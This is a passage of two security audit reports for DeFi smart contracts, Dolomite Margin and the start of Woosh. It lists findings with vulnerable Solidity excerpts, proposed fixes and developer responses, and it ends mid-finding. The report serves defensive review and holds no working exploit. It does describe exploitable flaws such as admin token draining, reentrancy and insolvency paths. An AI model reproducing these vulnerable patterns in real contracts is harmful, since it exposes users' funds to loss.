By passing the legacy token address of a double-entrypoint token as argument to [`AdminImpl::ownerWithdrawUnsupportedTokens`](https://github.com/feat/dolomite-margin/blob/e10f14320ece20d7492e8e68400333c5c7dec656/contracts/protocol/impl/AdminImpl.sol#L183), the admin can drain the entire token balance. The legacy token will not have a valid market id as it has not been added to Dolomite, so [`AdminImpl::_requireNoMarket`](https://github.com/feat/dolomite-margin/blob/e10f14320ece20d7492e8e68400333c5c7dec656/contracts/protocol/impl/AdminImpl.sol#L589) will pass.

```solidity
function ownerWithdrawUnsupportedTokens(
    Storage.State storage state,
    address token,
    address recipient
)
    public
    returns (uint256)
{
    _requireNoMarket(state, token);

    uint256 balance = IERC20Detailed(token).balanceOf(address(this));
    token.transfer(recipient, balance);

    emit LogWithdrawUnsupportedTokens(token, balance);

    return balance;
}
```

However, function calls on the legacy token will be forwarded to the new version, so the balance returned will be that of the token in the protocol, which will be transferrable to the admin.

**Impact:** This finding would have a critical impact, leaving the protocol in an insolvent state at the expense of its users; however, the likelihood is low due to external assumptions, and so we evaluate the severity as MEDIUM.

**Recommended Mitigation:** Loop through all supported Dolomite Margin markets and validate the collateral token balances before withdrawing unsupported tokens are equal to the token balances after.

**Dolomite:** Since Dolomites core protocol is built to support listing hundreds (or thousands) or assets, we dont want to implement the proposed fix. First, we dont intend to list any tokens with this strange behavior. Second, the proposed fix could cause us to run out of gas for a given block since iterating through the balances for each token will get really costly as the number of assets listed grows.

We may provide a hot fix for it in the future through an ownership adapter that adds this functionality.

**Cyfrin:** Acknowledged.


### Inaccurate accounting in `TradeImpl::buy` could lead to loss of user funds

**Description:** Within Dolomite Margin, [`TradeImpl::buy`](https://github.com/feat/dolomite-margin/blob/e10f14320ece20d7492e8e68400333c5c7dec656/contracts/protocol/impl/TradeImpl.sol#L44-L110) is used to perform a buy trade and takes `Actions.BuyArgs memory args` as one of its parameters. Given these arguments are supplied by the caller, they are free to set any arbitrary value for `args.exchangeWrapper`.

This `args.exchangeWrapper` parameter is used to [calculate the amount of `takerWei`](https://github.com/feat/dolomite-margin/blob/e10f14320ece20d7492e8e68400333c5c7dec656/contracts/protocol/lib/Exchange.sol#L106-L111) the contract should receive, and to [calculate how much should actually be transferred](https://github.com/feat/dolomite-margin/blob/e10f14320ece20d7492e8e68400333c5c7dec656/contracts/protocol/lib/Exchange.sol#L138-L145) to the Dolomite contract.

Given it is not guaranteed that these two values will be the same, the issue arises when there is a difference between the amount that should be received versus the actual amount received. This is partially handled in [`TradeImpl::buy`](https://github.com/feat/dolomite-margin/blob/e10f14320ece20d7492e8e68400333c5c7dec656/contracts/protocol/impl/TradeImpl.sol#L84-L89), which ensures the received amount is greater than or equal to the expected amount, acting as a slippage check. However, the internal accounting is [updated](https://github.com/feat/dolomite-margin/blob/e10f14320ece20d7492e8e68400333c5c7dec656/contracts/protocol/impl/TradeImpl.sol#L84-L95) based on the value expected to be received, instead of the value actually received.

**Impact:** Incorrect accounting could result in loss of user funds. Given that it is expected, but not guaranteed, that `takerWei == tokensReceived`, we evaluate the severity to MEDIUM.

**Recommended Mitigation:** Modify [these lines](https://github.com/feat/dolomite-margin/blob/e10f14320ece20d7492e8e68400333c5c7dec656/contracts/protocol/impl/TradeImpl.sol#L91-L95) to guarantee a correct update to protocol accounting.

```diff
//  TradeImpl::buy
    Require.that(
        tokensReceived.value >= makerWei.value,
        FILE,
        "Buy amount less than promised",
        tokensReceived.value
    );

-   state.setPar(
-       args.account,
-       args.makerMarket,
-       makerPar
-   );
+   state.setParFromDeltaWei(
+       args.account,
+       args.makerMarket,
+       makerIndex,
+       tokensReceived
+   );
```

**Dolomite:** Fixed as of commit[6a8ae06](https://github.com/dolomite-exchange/dolomite-margin/commit/6a8ae061fa84110db7b111512f705a6cd0a472bb).

**Cyfrin:** Resolved.


### `AdminImpl::ownerWithdrawExcessTokens` does not check the solvency of given market before attempting to withdraw excess tokens

**Description:** [`AdminImpl::ownerWithdrawExcessTokens`](https://github.com/feat/dolomite-margin/blob/e10f14320ece20d7492e8e68400333c5c7dec656/contracts/protocol/impl/AdminImpl.sol#L152-L181) allows the protocol admin to withdraw excess tokens in Dolomite Margin for a specific market. Excess tokens are calculated using the following formula:

```
Excess tokens = Token Balance (L) + Total Borrowed (B) - Total Supplied (S)
```

Here, `L` represents the real liquidity, which is the actual token balance in Dolomite Margin. `B` and `S` are virtual Dolomite balances. Over time, excess tokens increase as the protocol earns fees after passing the borrowers' interest fee to suppliers. The extent of these fees depends on the total outstanding borrowing in the market and the earnings rate.

However, in certain scenarios, the admin's withdrawal of `numExcessTokens` can lead to temporary insolvency in the protocol. This occurs when the token balance remaining after withdrawal is lower than the maximum withdrawable value for that market after adjusting for collateralization. This situation is especially likely in less liquid markets or in markets with high concentration risk, where a single entity has provided a significant portion of liquidity.

**Impact:** In this situation, withdrawal actions might cause a denial-of-service (DoS) due to the protocol's inadequate balance. While the consequences could be significant, the chance of this happening is minimal since fees are typically much lower than pool balances. As a result, we assess the severity level as MEDIUM.

**Proof of Concept:** _Assumptions:_
- The interest rate on USDC is 10% per year
- Earnings rate = 80% (20% of borrowing interest is the protocol fee)

Consider a simplified scenario below:

| Time  | Action | Alice | Bob  | Pete | USDC Balance | ETH Balance |  Excess USDC  |
|------|--------|---------|------|------| ------------| --------------| -------------- |
| T =0 | Alice deposits 2 ETH, Bob 5000 USDC    | 2   | 5000  | -  | 5000 | 2 |  0 |
| T=0 | Alice borrows 2000 USDC    | 2 , -2000    | 5000  | -  | 5000 | 2 |  0 |
| T=1yr | 200 USDC interest accrued    | 2, -2200  | 5160  | -  | 5000 | 2 |  40 |
| T=1yr | Pete deposits 1000 USDC    | 2, -2200  | 5160  | 1000  | 6000 | 2 |  40 |
| T=1yr | Bob withdraws 5160 USDC    | 2, -2200  | 0  | 1000  | 840 | 2 |  40 |
| T=1yr | Protocol withdraws 40 USDC    | 2, -2200  | 0  | 1000  | 800 | 2 |  0 |

At this stage, Pete cannot withdraw his deposit even though there is no loan against his account. This is because the protocol is temporarily insolvent until another liquidity provider deposits fresh liquidity.

**Recommended Mitigation:** To address this issue, it is recommended to introduce solvency checks for each market in the `AdminImpl::ownerWithdrawExcessTokens` function before completing withdrawals. The protocol should ensure that withdrawing excess tokens does not result in temporary insolvency.

**Dolomite:** A way to mitigate this in the future (without any code changes to the core protocol) is to have the admin withdraw their tokens and atomically redeposit them. This would enable the admin to compound their earnings, keeping liquidity in the protocol, while still enabling the admin to zero out their excess tokens.

**Cyfrin:** Acknowledged.


### Inadequate systemic risk-controls to support cross-asset collateralization across a wide range of assets

**Description:** Current Dolomite Margin risk controls can be classified into two categories:
 - Account-level risk controls
 - Systemic risk controls

Dolomite incorporates a robust risk monitoring architecture that comprehensively verifies the final state's validity at the conclusion of each operation. An operation, which encompasses a collection of transactions, undergoes thorough system checks to ensure the integrity and accuracy of the final state. This calculation happens in [`OperationImpl::_verifyFinalState`](https://github.com/dolomite-exchange/dolomite-margin/blob/e10f14320ece20d7492e8e68400333c5c7dec656/contracts/protocol/impl/OperationImpl.sol#L309) where both account-level and system-level risk is measured.

While the existing systemic risk controls address various aspects, such as borrowing limits, supply limits, collateral-only mode, and oracle sentinel, they fail to consider the systemic risk introduced by cross-asset collateralisation.

The creation of virtual liquidity without sufficient token backing can expose the protocol to risks associated with liquidity squeezes, freezes, and fluctuating asset correlations. This is similar to fractional banking in traditional finance, i.e., if a bank lends more than 10x its deposits, the bank exposes itself to insolvency risks due to tight liquidity conditions.

In the case of Dolomite Margin, the ratio of virtual liquidity to actual token balance can be considered as leverage - the higher the leverage, the greater the insolvency risk. If this virtual liquidity is utilised as collateral for additional borrowing, it can further amplify the leverage.

**Impact:** Higher protocol leverage can directly increase the risk of insolvency during periods of tight liquidity. Since such risks are attributed to extremely rare black-swan type of events, we evaluate the severity to MEDIUM.

**Proof of Concept:** Consider a USDT de-peg scenario where we see the following events unfold:

1. Virtual USDT holders will scramble to convert to real USDT liquidity, attempting to offload it anywhere possible.
2. Speculators, seeing an opportunity, will initiate cross-collateral borrow positions in USDT. High potential profits in short periods can make them overlook even steep interest rates at higher utilisation levels.
3. These virtual USDT tokens can then be swiftly exchanged for other stable tokens within Dolomite's internal pools.
4. Liquidators might hesitate to liquidate positions with USDT as collateral, anticipating potential high slippage in one-sided markets.

All the above factors may trigger a cascading effect, leading Dolomite to accumulate substantial USDT bad debt. While borrow/supply limits exist, introducing additional safeguards to curb unbacked liquidity could better equip Dolomite to manage potential contagion scenario.

**Recommended Mitigation:** To enhance the system's robustness, consider adding a systemic risk measure to the `OperationImpl::_verifyFinalState` function that caps the leverage per market. Consider implementing a cap on leverage for less liquid markets restricting the ability of users to open cross asset borrowing positions without having enough real liquidity.


**Dolomite:** We think this is better managed through the use of a Global Operator. Each situation has so much nuance to it. So the ability to force close, or add mechanisms that can modify positions will be really helpful in tackling nearly any situation

**Cyfrin:** Acknowledged. While Global Operators certainly bolster Dolomite's agility in making rapid account adjustments, their responsiveness and efficacy in widespread crises remain ambiguous. Past events, such as the Terra Luna incident, have shown that speculators often exploit de-peg situations, making aggressive bets that potentially saddle the protocol with significant bad debt. We continue to recommend additional risk controls that limit the creation of unbacked virtual liquidity to mitigate any existential threats during such rare contagion scenarios.


\clearpage
## Low Risk


### Incorrect logic in `Bits::unsetBit` when applied to a zero bit

**Description:** `Bits::unsetBit` might not work as expected for cases when the bit to be unset is not 1.

It is currently implemented as:

```solidity
function unsetBit(
    uint bitmap,
    uint bit
) internal pure returns (uint) {
    return bitmap - (ONE << bit);
}
```

This implementation will only correctly unset a bit if that bit is already set to 1. If the bit were set to 0, due to the way in which binary subtraction works, this operation would instead set it to 1 and modify other bits as well (which is unlikely to be the intended behavior).

A more appropriate way to unset a bit would be to use a bitwise `AND` operation with the complement of the bit mask. The corrected implementation would look like this:

```solidity
function unsetBit(
    uint bitmap,
    uint bit
) internal pure returns (uint) {
    return bitmap & ~(ONE << bit);
}
```

In this version, `(ONE << bit)` creates a mask where only the bit at position bit is set to 1. The `~` operator then inverts this mask, setting the bit at position bit to 0 and all other bits to 1. Finally, the bitwise `AND` operation leaves all bits in the bitmap unchanged, except for the bit at position bit, which is unset (set to 0).

**Impact:** It appears this function is only ever called with set bits due to `Bits::getLeastSignificantBit` being called beforehand in [both](https://github.com/feat/dolomite-margin/blob/e10f14320ece20d7492e8e68400333c5c7dec656/contracts/external/helpers/LiquidatorProxyBase.sol#L431-L441) [instances](https://github.com/feat/dolomite-margin/blob/e10f14320ece20d7492e8e68400333c5c7dec656/contracts/protocol/lib/Storage.sol#L919-L935); otherwise, this finding would have a much higher impact, but we evaluate the severity to LOW.

**Recommended Mitigation:** Use the modified version of the function above.

**Dolomite:** Fixed as of commit[6a8ae06](https://github.com/dolomite-exchange/dolomite-margin/commit/6a8ae061fa84110db7b111512f705a6cd0a472bb).

**Cyfrin:** Acknowledged.


### OpenZeppelin v2.5.1 is not supported for non-critical security patches

The Dolomite Margin smart contracts currently use OpenZeppelin contracts v2.5.1, while the latest release is v4.9.2. Per the [OpenZeppelin security policy](https://github.com/OpenZeppelin/openzeppelin-contracts/security?page=1#supported-versions), only critical severity bug fixes will be backported to past major releases. In light of this, it is possible that future bug reports or changes to the protocol may introduce vulnerabilities and so it is recommended to use a more up-to-date version.

**Dolomite:** In order to maintain compatibility with the rest of Dolomites smart contracts which use Solidity v5, we use the latest major version of OpenZeppelin v2. If we ever decide to upgrade the smart contracts, well be sure to bump the OpenZeppelin version as well.

**Cyfrin:** Acknowledged.


### It may be possible to exploit external call in `CallImpl::call`

**Description:** [`CallImpl::call`](https://github.com/feat/dolomite-margin/blob/e10f14320ece20d7492e8e68400333c5c7dec656/contracts/protocol/impl/CallImpl.sol#L39) contains the following logic:
```solidity
state.requireIsOperator(args.account, msg.sender);
ICallee(args.callee).callFunction(
    msg.sender,
    args.account,
    args.data
);
```
Selector clashing and/or fallback function for a given callee can be triggered here with arbitrary data in the context of `DolomiteMargin`, assuming the sender is an operator for the given account. `DolomiteMargin` libraries are deployed as standalone contracts, so it appears `OperationImpl` will be `msg.sender` in the context of the call.

Fortunately, this cannot be used to exploit the [infinite WETH approval](https://github.com/feat/dolomite-margin/blob/e10f14320ece20d7492e8e68400333c5c7dec656/contracts/external/proxies/DepositWithdrawalProxy.sol#L102) in `DepositWithdrawalProxy::initializeETHMarket` as there are no clashing selectors and the WETH fallback function simply attempts to deposit `msg.value`.

**Impact:** This finding could have critical severity under certain circumstances but depends on a number of external assumptions, which significantly reduce the likelihood, and so we evaluate the severity to LOW.

**Recommended Mitigation:** Consider whitelisting the trusted contracts that can be used as `args.callee`.

**Dolomite:** Wed prefer to keep the implementation as permissionless as possible. If theres another possible check we can put in place, wed gladly explore it.

**Cyfrin:** Acknowledged.


### Violation of the Checks Effects Interactions Pattern in `LiquidateOrVaporize::liquidate` and `LiquidateOrVaporize::vaporize` could result in read-only reentrancy vulnerabilities

**Description:** When liquidating or vaporizing an undercollateralized account, there are [a](https://github.com/feat/dolomite-margin/blob/e10f14320ece20d7492e8e68400333c5c7dec656/contracts/protocol/impl/LiquidateOrVaporizeImpl.sol#L124-L130) [number](https://github.com/feat/dolomite-margin/blob/e10f14320ece20d7492e8e68400333c5c7dec656/contracts/protocol/impl/LiquidateOrVaporizeImpl.sol#L144-L150) [of](https://github.com/feat/dolomite-margin/blob/e10f14320ece20d7492e8e68400333c5c7dec656/contracts/protocol/impl/LiquidateOrVaporizeImpl.sol#L262-L268) [instances](https://github.com/feat/dolomite-margin/blob/e10f14320ece20d7492e8e68400333c5c7dec656/contracts/protocol/impl/LiquidateOrVaporizeImpl.sol#L277-L283) where [SafeLiquidationCallback::callLiquidateCallbackIfNecessary](https://github.com/feat/dolomite-margin/blob/e10f14320ece20d7492e8e68400333c5c7dec656/contracts/protocol/lib/SafeLiquidationCallback.sol#L44) is called, temporarily [handing off execution](https://github.com/feat/dolomite-margin/blob/e10f14320ece20d7492e8e68400333c5c7dec656/contracts/protocol/lib/SafeLiquidationCallback.sol#L53) to the liquid account owner. While there are [precautions in place](https://github.com/feat/dolomite-margin/blob/e10f14320ece20d7492e8e68400333c5c7dec656/contracts/protocol/lib/SafeLiquidationCallback.sol#L54-L55) to mitigate against gas-griefing and return data bombing attacks, this logic fails to prevent vulnerabilities in third-party protocols which may rely on state from Dolomite Margin. Updates to state balances are performed after these calls, so whilst it is [acknowledged](https://github.com/feat/dolomite-margin/blob/e10f14320ece20d7492e8e68400333c5c7dec656/contracts/protocol/interfaces/ILiquidationCallback.sol#L34-L36) in the interface and cannot be exploited directly given the global protocol-level reentrancy guard, this may expose integrating protocols to a read-only reentrancy attack vector.

**Impact:** There is no immediate impact on Dolomite Margin, but this finding could impact other ecosystem protocols which may be affected by intermediate protocol state, so we evaluate the severity as LOW.

**Recommended Mitigation:** Update state balances prior to making unsafe external calls.

**Dolomite:** Were adding the callback mechanism to all Actions that modify the users virtual balance but dont materialize an ERC20 transfer event.  To standardise it, they were added before the Actions events are logged. Those actions are `Transfer` , `Trade`, `Liquidate` , and `Vaporize`.  We also added a variable called `callbackGasLimit` that lets the admin set the amount of gas to allocate to the callback functions. This allows for more control over deployments where gas may not be measured the same way.

Fixes added as of commit[6a8ae06](https://github.com/dolomite-exchange/dolomite-margin/commit/6a8ae061fa84110db7b111512f705a6cd0a472bb).

**Cyfrin:** Acknowledged. In the specified commit, we noted changes unrelated to this audit concern, particularly changes related to callbacks and the introduction of callbackGasLimit replacing the prior hardcoded gas. Our review focused solely on the consistency of the CEI pattern in the liquidate and vaporize functions, without delving into the wider implications of these modifications.




### Lack of max value validation in `AdminImpl::ownerSetAccountMaxNumberOfMarketsWithBalances`

**Description:** Currently, there is no protection to stop the admin from setting a value greater than an upper bound when calling [`AdminImpl::ownerSetAccountMaxNumberOfMarketsWithBalances`](https://github.com/feat/dolomite-margin/blob/e10f14320ece20d7492e8e68400333c5c7dec656/contracts/protocol/impl/AdminImpl.sol#L403), only the condition that it should be at least 2:

```solidity
Require.that(
    accountMaxNumberOfMarketsWithBalances >= 2,
    FILE,
    "Acct MaxNumberOfMarkets too low"
);
```

This could lead to a denial-of-service scenario that is intended to be prevented, so there should be an additional maximum validation.

**Impact:** There is low likelihood due to reliance on admin error and so we evaluate the severity as LOW.

**Recommended Mitigation:** Add additional validation for the upper bound when the owner sets the maximum allowed number of markets with balances for a given account.

**Dolomite:** Fixed as of commit[6a8ae06](https://github.com/dolomite-exchange/dolomite-margin/commit/6a8ae061fa84110db7b111512f705a6cd0a472bb). Added an upper bound of 64 markets.

**Cyfrin:** Acknowledged.


### Inadequate checks and high trust assumptions while setting global operators

**Description:** Dolomite introduces the concept of `Global Operators`, which are accounts authorised to perform actions on behalf of other users. The purpose of these accounts is to enhance user experience by minimising the need for constant transaction approvals. However, it is important to recognise the potential risks associated with malicious global operators who possess privileged access. Two instances in the code highlight these risks:

Malicious global operators, because of their privileged access, can potentially cause a lot of damage. Two such instances observed in the code are:

1.Global operators can create new borrow positions on behalf of users using the `BorrowPositionProxyV2::openBorrowPositionWithDifferentAccounts` function

2. Global operators implementing `IAutoTrader` can act as market makers for users, engaging in trading activities with their taker counterparts.

Upon discussions with the protocol team, it was clarified that only specific contracts are assigned the Global Operator role, with no intention to designate externally owned accounts (EOAs) as Global Operators. However, considering the significant control wielded by global operators, the current checks and controls for assigning this role are inadequate.

**Impact:** A malicious global operator has the capability to manipulate funds by engaging in unauthorized trading or borrowing against user accounts.

**Recommended Mitigation:** To strengthen the security of the system, the following additional checks are advised when assigning a global operator:

- Explicitly check that global operator is not a Externally Owned Account (EOA).
- Implement a time-lock mechanism when registering a new global operator.
- Establish a whitelisting mechanism, allowing only specific contracts within the whitelisted universe to be assigned as global operators.

**Dolomite:** Dolomite maximizes being generic on the core level and weve tried to put in place as many safeguards as possible for input validation.

The protocol is currently governed by a delayed multi sig and eventually a time-locked DAO (implementation not complete as of now). This enables the protocol to time-gate everything and leave the details to match the needs of the protocol depending on who owns it.

Were not going to add the EOA check because there are valid use cases in the future for setting a create2 address as a global operator, which would not be possible anymore with the proposed check.

If for any reason control of the protocol is hijacked, the hijacker can create a malicious operator contract which would be just as bad as an EOA, anyway.

**Cyfrin:** Acknowledged.

\clearpage
## Informational


### Repeated logic can be reused with a shared internal function

`BorrowPositionProxyV1::openBorrowPosition` and `BorrowPositionProxyV1::transferBetweenAccounts` both contain the following repeated code:
```solidity
AccountActionLib.transfer(
    DOLOMITE_MARGIN,
    /* _fromAccountOwner = */ msg.sender, // solium-disable-line
    _fromAccountNumber,
    /* _toAccountOwner = */ msg.sender, // solium-disable-line
    _toAccountNumber,
    _marketId,
    Types.AssetAmount({
        sign: false,
        denomination: Types.AssetDenomination.Wei,
        ref: Types.AssetReference.Delta,
        value: _amountWei
    }),
    _balanceCheckFlag
);
```
Consider moving this to a shared internal function to reduce bytecode size.

**Dolomite:** Fixed as of commit [6a8ae06](https://github.com/dolomite-exchange/dolomite-margin/commit/6a8ae061fa84110db7b111512f705a6cd0a472bb).

**Cyfrin:** Acknowledged.


### `BorrowPositionProxyV2` allows authorized global operators to unilaterally modify positions and transfer debt between accounts

`BorrowPositionProxyV2` contains functions for opening/closing/transferring/repaying borrow positions with different accounts when called by an authorized sender. Whilst this is the intended behavior of the protocol with its global operators and this specific proxy, it is worth noting that this does allow authorized operators to transfer debt from one account to another unilaterally.

**Dolomite:** We use this functionality to cross boundaries of accounts owned by the same user. For example, Isolation Mode vaults are essentially smart contract wallets owned by an EOA. We use the BorrowPositionProxyV2 so the user can transfer funds from their account to their vault.

**Cyfrin:** Acknowledged.


### Inconsistencies in project README.md

The project README states that `numberOfMarketsWithBorrow` field has been added to `Account.Storage`, but it should instead be `numberOfMarketsWithDebt`.

Additionally, it states that a require statement has been added to `OperationImpl` that forces liquidations to come from a global operator, but this should be `LiquidateOrVaporizeImpl`.

Similarly, the require statement that forces expirations to come from a global operator has been added to `TradeImpl::trade` and not `OperationImpl`.

Consider adding links to relevant lines of code to make navigating these changes easier.

**Dolomite:** Fixed as of commit[6a8ae06](https://github.com/dolomite-exchange/dolomite-margin/commit/6a8ae061fa84110db7b111512f705a6cd0a472bb).

**Cyfrin:** Acknowledged.


### Unverifiable contracts resulting from logic abstraction in externally scoped implementations

**Description:** Dolomite is a versatile base layer that facilitates various actions across multiple tokens. The current audit scope encompasses contracts such as `GenericTraderProxyV1.sol` and `LiquidatorProxyV4WithGenericTrader.sol`. These contracts rely on interfaces like `IIsolationModeUnwrapperTrader::createActionsForUnwrapping` and `IIsolationModeWrapperTrader::createActionsForWrapping` within key functions such as `GenericTraderProxyBase::_appendTraderActions`. Similarly, the interface function `IIsolationModeToken.isTokenConverterTrusted` is utilised in `GenericTraderProxyBase::_validateIsolationModeStatusForTraderParam`.

During the audit, the absence of wrapper/unwrapper trader implementations hindered our ability to verify the precise logic behind creating wrapping and unwrapping actions. The incorrect sequencing or execution of these actions may introduce vulnerabilities that impact the business logic of the mentioned contracts. Additionally, the lack of isolation mode token contracts within the audit's scope prevented us from examining the rationale behind token converter trust. Consequently, we are unable to verify critical functionalities of certain proxy contracts.

**Impact:** Interacting with these interfaces may lead to unforeseen issues that we are currently unable to comprehend.

**Recommended Mitigation:** To address this, it is crucial to provide the necessary implementations for the missing contracts and functions.

**Dolomite:** Acknowledged.

**Cyfrin:** Acknowledged.

\clearpage

------ FILE END car/reports_md/2023-08-26-cyfrin-dolomite-margin.md ------


------ FILE START car/reports_md/2023-09-06-cyfrin-woosh.md ------

**Lead Auditors**

[Hans](https://twitter.com/hansfriese)

**Assisting Auditors**

[0kage](https://twitter.com/0kage_eth)


---

# Findings
## Medium Risk
### Non-standard ERC20 tokens are not supported
**Severity:** Medium

**Description:** The protocol implemented a function `deposit()` to allow users to deposit.
```solidity
DepositVault.sol
37:     function deposit(uint256 amount, address tokenAddress) public payable {
38:         require(amount > 0 || msg.value > 0, "Deposit amount must be greater than 0");
39:         if(msg.value > 0) {
40:             require(tokenAddress == address(0), "Token address must be 0x0 for ETH deposits");
41:             uint256 depositIndex = deposits.length;
42:             deposits.push(Deposit(payable(msg.sender), msg.value, tokenAddress));
43:             emit DepositMade(msg.sender, depositIndex, msg.value, tokenAddress);
44:         } else {
45:             require(tokenAddress != address(0), "Token address must not be 0x0 for token deposits");
46:             IERC20 token = IERC20(tokenAddress);
47:             token.safeTransferFrom(msg.sender, address(this), amount);
48:             uint256 depositIndex = deposits.length;
49:             deposits.push(Deposit(payable(msg.sender), amount, tokenAddress));//@audit-issue fee-on-transfer, rebalancing tokens will cause problems
50:             emit DepositMade(msg.sender, depositIndex, amount, tokenAddress);
51:
52:         }
53:     }
```
Looking at the line L49, we can see that the protocol assumes `amount` of tokens were transferred.
But this does not hold true for some non-standard ERC20 tokens like fee-on-transfer tokens or rebalancing tokens.
(Refer to [here](https://github.com/d-xo/weird-erc20) about the non-standard weird ERC20 tokens)

For example, if token incurs fee on transfer, the actually transferred amount will be less than the provided parameter `amount` and the `deposits` will have a wrong state value. Because the current implementation only allows full withdrawal, this means the tokens will be locked in the contract permanently.

**Impact:** If non-standard ERC20 tokens are used, the tokens could be locked in the contract permanently.

**Recommended Mitigation:**
- We recommend adding another field in the `Deposit` structure, say `balance`
- We recommend allow users to withdraw partially and decrease the `balance` field appropriately for successful withdrawals.
If these changes are going to be made, we note that there are other parts that need changes. For example, the withdraw function would need to be updated so that it does not require the withdrawal amount is same to the original deposit amount.

**Protocol:**
Contract updated to support non-standard ERC-20 tokens. We've decided to not allow users to partially withdraw since it would complicate the logic of the signatures, as of now only full withdraws can be executed.

**Cyfrin:** Verified in commit [405fa78](https://github.com/HyperGood/woosh-contracts/commit/405fa78a2c0cf8b8ab8943484cb95b5c8807cbfb).

### Use call instead of transfer
**Severity:** Medium

**Description:** In both of the withdraw functions, `transfer()` is used for native ETH withdrawal.
The transfer() and send() functions forward a fixed amount of 2300 gas. Historically, it has often been recommended to use these functions for value transfers to guard against reentrancy attacks. However, the gas cost of EVM instructions may change significantly during hard forks which may break already deployed contract systems that make fixed assumptions about gas costs. For example. EIP 1884 broke several existing smart contracts due to a cost increase of the SLOAD instruction.

**Impact:** The use of the deprecated transfer() function for an address will inevitably make the transaction fail when:
- The claimer smart contract does not implement a payable function.
- The claimer smart contract does implement a payable fallback which uses more than 2300 gas unit.
- The claimer smart contract implements a payable fallback function that needs less than 2300 gas units but is called through proxy, raising the call's gas usage above 2300.

Additionally, using higher than 2300 gas might be mandatory for some multisig wallets.

**Recommended Mitigation:** Use call() instead of transfer().

**Protocol:**
Agree, transfer was causing issues with smart contract wallets.

**Cyfrin:** Verified in commit [7726ae7](https://github.com/HyperGood/woosh-contracts/commit/7726ae72118cfdf91ceb9129e36662f69f4d42de).

## Low Risk
### The deposit function is not following CEI pattern
**Severity:** Low

**Description:** The protocol implemented a function `deposit()` to allow users to deposit.
```solidity
DepositVault.sol
37:     function deposit(uint256 amount, address tokenAddress) public payable {
38:         require(amount > 0 || msg.value > 0, "Deposit amount must be greater than 0");
39:         if(msg.value > 0) {
40:             require(tokenAddress == address(0), "Token address must be 0x0 for ETH deposits");
41:             uint256 depositIndex = deposits.length;
42:             deposits.push(Deposit(payable(msg.sender), msg.value, tokenAddress));
43:             emit DepositMade(msg.sender, depositIndex, msg.value, tokenAddress);
44:         } else {
45:             require(tokenAddress != address(0), "Token address must not be 0x0 for token deposits");
46:             IERC20 token = IERC20(tokenAddress);
47:             token.safeTransferFrom(msg.sender, address(this), amount);//@audit-issue against CEI pattern
48:             uint256 depositIndex = deposits.length;
49:             deposits.push(Deposit(payable(msg.sender), amount, tokenAddress));
50:             emit DepositMade(msg.sender, depositIndex, amount, tokenAddress);
51:
52:         }
53:     }
```
Looking at the line L47, we can see that the token transfer happens before updating the accounting state of the protocol against the CEI pattern.
Because the protocol intends to support all ERC20 tokens, the tokens with hooks (e.g. ERC777) can be exploited for reentrancy.
Although we can not verify an exploit that causes explicit loss due to this, it is still highly recommended to follow CEI pattern to prevent possible reentrancy attack.

**Recommended Mitigation:** Handle token transfers after updating the `deposits` state.

**Protocol:**
Fixed in commit [7726ae7](https://github.com/HyperGood/woosh-contracts/commit/7726ae72118cfdf91ceb9129e36662f69f4d42de).

**Cyfrin:** We note that the protocol still does not follow CEI pattern in the final commit [b21d23e](https://github.com/HyperGood/woosh-contracts/commit/b21d23e661b0f25f0e757dc00ee90e4464730b1b).
But we also acknowledge that the fix in [405fa78](https://github.com/HyperGood/woosh-contracts/commit/405fa78a2c0cf8b8ab8943484cb95b5c8807cbfb) to support non-standard ERC20 tokens makes it impossible to follow CEI pattern.
For the current implementation, we verified that there is no reentrancy attack vector due to this issue. If the protocol intends any upgrades in the future related to the `deposits` state, we recommend using [OpenZeppelin's ReentrancyGuard](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/8a0b7bed82d6b8053872c3fd40703efd58f5699d/contracts/security/ReentrancyGuard.sol#L22) to prevent possible reentrancy attack.
Please note that the lack of CEI pattern will still be problematic in the sense of [Read-only reentrancy](https://officercia.mirror.xyz/DBzFiDuxmDOTQEbfXhvLdK0DXVpKu1Nkurk0Cqk3QKc) if the states `deposits` are going to be utilized for any other purposes.

## Informational Findings
### Nonstandard usage of nonce
**Severity:** Informational

**Description:** The protocol implemented two withdraw functions `withdrawDeposit()` and `withdraw()`.
While the function `withdrawDeposit()` is designed to be used by the depositor themselves, the function `withdraw()` is designed to be used by anyone who has a signature from the depositor.
The function `withdraw()` has a parameter `nonce` but the usage of this param is not aligned with the general meaning of nonce.
```solidity
DepositVault.sol
59:     function withdraw(uint256 amount, uint256 nonce, bytes memory signature, address payable recipient) public {
60:         require(nonce < deposits.length, "Invalid deposit index");
61:         Deposit storage depositToWithdraw = deposits[nonce];//@audit-info non aligned with common understanding of nonce
62:         bytes32 withdrawalHash = getWithdrawalHash(Withdrawal(amount, nonce));
63:         address signer = withdrawalHash.recover(signature);
64:         require(signer == depositToWithdraw.depositor, "Invalid signature");
65:         require(!usedWithdrawalHashes[withdrawalHash], "Withdrawal has already been executed");
66:         require(amount == depositToWithdraw.amount, "Withdrawal amount must match deposit amount");
67:
68:         usedWithdrawalHashes[withdrawalHash] = true;
69:         depositToWithdraw.amount = 0;
70:
71:         if(depositToWithdraw.tokenAddress == address(0)){
72:             recipient.transfer(amount);
73:         } else {
74:             IERC20 token = IERC20(depositToWithdraw.tokenAddress);
75:             token.safeTransfer(recipient, amount);
76:         }
77:
78:         emit WithdrawalMade(recipient, amount);
79:     }
```
In common usage, nonce is used to track the latest transaction from the EOA and generally it is increased on the user's transaction. It can be effectively used to invalidate the previous signature by the signer.
But looking at the current implementation, the parameter `nonce` is merely used as an index to refer the `deposit` at a specific index.

This is a bad naming and can confuse the users.

**Recommended Mitigation:** If the protocol intended to provide a kind of invalidation mechanism using the nonce, there should be a separate mapping that stores the nonce for each user. The current nonce can be used to generate a signature and a depositor should be able to increase the nonce to invalidate the previous signatures. Also the nonce would need to be increased on every successful call to `withdraw()` to prevent replay attack.
Please note that with this remediation, the mapping `usedWithdrawalHashes` can be removed completely because the hash will be always decided using the latest nonce and the nonce will be invalidated automatically (because it increases on successful call).

If this is not what the protocol intended, the parameter nonce can be renamed to `depositIndex` as implemented in the function `withdrawDeposit()`.

**Client:**
Fixed in commit [b21d23e](https://github.com/HyperGood/woosh-contracts/commit/b21d23e661b0f25f0e757dc00ee90e4464730b1b).

**Cyfrin:** Verified.

### Unnecessary parameter amount in withdraw function

**Severity:** Informational

**Description:** The function `withdraw()` has a parameter `amount` but we don't understand the necessity of this parameter.
At line L67, the amount is required to be the same to the whole deposit amount. This means the user does not have a flexibility to choose the withdraw amount, after all it means the parameter was not necessary at all.
```solidity
DepositVault.sol
